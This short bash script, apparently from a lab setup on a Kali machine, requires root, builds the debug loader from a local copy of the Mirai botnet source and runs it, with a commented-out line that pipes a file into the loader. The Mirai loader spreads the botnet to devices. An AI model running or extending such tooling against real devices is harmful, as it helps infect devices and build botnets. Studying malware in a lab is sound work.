#!/bin/bash

if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# setting path to Mirai source Folder
pathToMirai=/home/kali/Desktop/MiraiRepository/mirai/MiraiSourceCode
export pathToMirai

cd $pathToMirai/loader
sudo bash ./build.debug.sh &> /dev/null
# cat ./file.txt | ./loader.dbg | tee /home/kali/Desktop/outputDBG.txt
./loader.dbg
printf "\n\n"
echo ----------------------------------------------------
read -n 1 -s -r -p "Press any key to continue"
